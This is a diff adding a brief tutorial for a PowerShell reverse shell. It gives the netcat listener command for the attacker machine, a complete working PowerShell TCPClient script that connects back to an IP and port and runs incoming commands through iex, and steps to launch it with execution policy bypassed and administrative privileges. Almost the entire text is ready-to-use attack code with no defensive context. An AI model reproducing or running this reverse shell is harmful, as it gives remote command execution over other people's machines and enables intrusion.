@@ -1,0 +1,32 @@
+On the Attacker Machine (Ubuntu)
+Start a Netcat Listener:
+This will listen for incoming connections from the target machine.
+
+
+nc -lvnp 4444
+Replace 4444 with the port number you wish to use for the reverse shell.
+On the Target Machine (PowerShell)
+Create and Execute the PowerShell Reverse Shell Script:
+This script will connect back to the attacker's machine and provide a reverse shell.
+
+$client = New-Object System.Net.Sockets.TCPClient("192.168.1.193", 4444); 
+$stream = $client.GetStream(); 
+[byte[]]$bytes = 0..65535|%{0}; 
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); 
+    $sendback = (iex $data 2>&1 | Out-String ); 
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> "; 
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); 
+    $stream.Write($sendbyte, 0, $sendbyte.Length); 
+    $stream.Flush() 
+}
+$client.Close()
+Replace "192.168.1.193" with the IP address of your Ubuntu machine and 4444 with the port number you specified.
+
+Execution Steps
+Copy the PowerShell Script: Copy the above PowerShell script into a .ps1 file, for example, reverse-shell.ps1.
+
+Run the PowerShell Script on the Target Machine: Execute the script on the target machine. Open PowerShell with administrative privileges and run:
+
+powershell -ExecutionPolicy Bypass -File .\reverse-shell.ps1
+Receive the Connection: Your Netcat listener on the Ubuntu machine should now receive a connection from the target machine, providing you with a reverse shell.
